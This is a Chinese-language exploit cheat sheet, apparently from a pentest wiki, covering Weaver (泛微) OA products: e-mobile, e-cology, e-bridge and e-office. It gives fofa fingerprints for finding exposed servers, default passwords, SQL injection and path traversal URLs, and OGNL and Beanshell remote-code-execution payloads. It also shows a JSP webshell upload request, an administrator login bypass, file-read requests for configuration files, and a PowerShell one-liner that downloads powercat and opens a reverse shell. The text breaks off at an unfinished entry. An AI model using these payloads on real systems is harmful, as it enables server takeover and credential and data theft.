---
### 泛微
> 官网 : https://www.weaver.com.cn/
**相关文章**
- [应用安全 - 软件漏洞 - 泛微OA漏洞汇总](https://www.cnblogs.com/AtesetEnginner/p/11558469.html)
- [泛微 e-mobile 相关漏洞](https://mp.weixin.qq.com/s/nYTXWXs-40oR41k1UsHJyw)
**相关工具**
- [z1un/weaver_exp](https://github.com/z1un/weaver_exp)
**敏感文件泄露**
- `/messager/users.data`
- `/plugin/ewe/jsp/config.jsp`
**路径遍历**
- `/plugin/ewe/admin/upload.jsp?id=11&dir=../../../`
- `/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'../ecology/WEB-INF/prop/weaver.properties'`
#### e-mobile
> fofa: app="泛微-EMobile"
**E-mobile**
```
admin/admin111
```
**E-Mobile 4.5 RCE**
```
**.**.**.**/verifyLogin.do
data：loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${@**.**.**.**.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**:89/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
```
**CNVD-2017-03561 e-mobile  fofa: app="Weaver-OA"
> fofa: app="泛微-协同办公 OA"
**指纹**
- `Set-Cookie: ecology_JSessionId=`
- `ecology`
**OA 默认口令**
```
sysadmin/1
```
**/services/MobileService?wsdl 注入**
- 相关文章
    - [泛微e-cology7.1 SOAP注入引发的血案](https://www.mrwu.red/web/1598.html)
    - [泛微协同商务系统e-cology某处SQL注入](https://www.uedbox.com/post/14232/)
**泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705**
- 相关文章
    - [泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705](http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html)
- POC | Payload | exp
    ```
    /sysinterface/codeEdit.jsp
    ```
**e-cology OA Beanshell 组件远程代码执行**
- 相关文章
    - [[漏洞预警]泛微e-cology OA Beanshell组件远程代码执行分析](https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg)
    - [泛微e-cology OA Beanshell组件远程代码执行漏洞复现](https://mp.weixin.qq.com/s/LpXiLukOKMfMSa8gUYBqNA)
- POC | Payload | exp
    - [jas502n/e-cology](https://github.com/jas502n/e-cology)
    ```
    /weaver/bsh.servlet.BshServlet
    ```
    ```
    eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");
    ```
    泛微多数都是 windows 环境, 反弹 shell 可以使用 pcat
    ```
    powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
    ```
**ecology8_mobile_sql_inject**
- POC | Payload | exp
    - [ecology8_mobile_sql_inject](https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py)
**泛微 OA WorkflowCenterTreeData 接口注入漏洞(限 oracle 数据库)**
- POC | Payload | exp
    - [AdministratorGithub/e-cology-OA-SQL](https://github.com/AdministratorGithub/e-cology-OA-SQL)
**泛微 ecology OA 系统接口存在数据库配置信息泄露漏洞**
- 相关文章
    - [泛微ecology OA数据库配置信息泄露漏洞复现](https://mp.weixin.qq.com/s/u8GIfMBRZFAN3HANSSSgQA)
- POC | Payload | exp
    - [jas502n/DBconfigReader](https://github.com/jas502n/DBconfigReader)
    - [NS-Sp4ce/Weaver-OA-E-cology-Database-Leak](https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak)
**泛微OA V8 SQL注入漏洞**
- 描述
    泛微 OA V8 存在 SQL 注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限
- POC | Payload | exp
    ```
    /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
    ```
**泛微OA V9前台上传漏洞**
- 描述
    泛微 OA V9 存在文件上传接口导致任意文件上传, 漏洞位于: /page/exportImport/uploadOperation.jsp 文件中
- POC | Payload | exp
    ```
    POST /page/exportImport/uploadOperation.jsp HTTP/1.1
    Host: x.x.x.x
    Content-Length: 216
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://x.x.x.x/
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
    Connection: close
    ------WebKitFormBoundaryFy3iNVBftjP6IOwo
    Content-Disposition: form-data; name="file"; filename="12.jsp"
    Content-Type: application/octet-stream
    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
    ```
    ```
    page/exportImport/fileTransfer/12.jsp
    ```
**泛微OA V9 E-Cology WorkflowServiceXml RCE**
- 描述
    泛微 E-cology OA 系统的 WorkflowServiceXml 接口可被未授权访问，攻击者调用该接口，可构造特定的 HTTP 请求绕过泛微本身一些安全限制从而达成远程代码执行
- 相关文章
    - [E-Cology WorkflowServiceXml RCE](https://mp.weixin.qq.com/s/DVlZC5jU6MQQqUoM2gKTBg)
    - [泛微E-Cology WorkflowServiceXml RCE](http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE.html?h=%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE)
    - [HVV行动之某OA流量应急](https://mp.weixin.qq.com/s/68sQAkT3CBff4Y40OPJvxQ)
    - [微某OA从0day流量分析到武器化利用](https://mp.weixin.qq.com/s/iTP9jBypsJEsSlAIaNOnhw)
    - [泛微 WorkflowServiceXml RCE 复现](https://www.o2oxy.cn/3561.html)
**泛微OA weaver.common.Ctrl 任意文件上传漏洞**
- 描述
    泛微 OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传 webshell 文件控制服务器
- 相关文章
    - [泛微OA weaver.common.Ctrl 任意文件上传漏洞](https://mp.weixin.qq.com/s/ePYRFPfu-pvWMKSiffporA)
    - [泛微OA 前台GetShell复现](https://ailiqun.xyz/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/)
    - [HVV 某OA文件上传漏洞分析](https://mp.weixin.qq.com/s/wX0cCMaCM9UhP6F4MxdeKQ)
**com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 任意文件上传**
- 相关文章
    - [泛微e-cology任意文件上传(已修复)](https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w)
**weaver.workflow.exceldesign.ExcelUploadServlet 任意文件上传**
- 相关文章
    - [泛微e-cology另一接口任意文件上传(已修复)](https://mp.weixin.qq.com/s/nRnNyFfDQYxmFwA-7-IBVQ)
**/workrelate/plan/util/uploaderOperate.jsp + /OfficeServer 文件上传**
- POC | Payload | exp
    - https://github.com/sobinge/2022-HW-POC/blob/main/%E6%B3%9B%E5%BE%AEOA%20uploaderOperate.jsp%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
**管理员任意登录**
- POC | Payload | exp
    ```
    /mobile/plugin/VerifyQuickLogin.jsp
    identifier=1&language=1&ipaddress=
    ```
#### e-bridge
> fofa: app="泛微-云桥 e-Bridge"
**泛微云桥 /wxjsapi/saveYZJFile 任意文件读取**
- 描述
    未授权任意文件读取,/wxjsapi/saveYZJFile 接口获取 filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。
- 相关文章
    - [泛微云桥-任意文件读取深入利用](https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w)
- POC | Payload | exp
    ```
    downloadUrl 参数修改成需要获取文件的绝对路径,记录返回包中的 id 值
    /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c:windows/win.ini&fileExt=txt
    ```
    通过查看文件接口访问 /file/fileNoLogin/id
    ```
    /file/fileNoLogin/xxxxxxxxxxxxxxxxx
    ```
    参考安识科技 A-Team 利用方法,https://mp.weixin.qq.com/s/Y_2_e7HIWH3z5jhMsK7pZA
    ```
    参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”
    /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt
    常见路径
    d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties
    d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库
    ```
#### e-office
> fofa: app="泛微-EOffice"
**指纹**
- `/general/login/index.php`
**相关文章**
- [【攻防演练】某协同办公系统多个1day分析过程](https://forum.butian.net/share/1791)
- [E-office Server_v9.0 漏洞分析](https://mp.weixin.qq.com/s/JP-kIsWeQ0HZPs9jZjL24A)
**E-Office officeserver.php 任意文件读取漏洞**
- POC | Payload | exp
    ```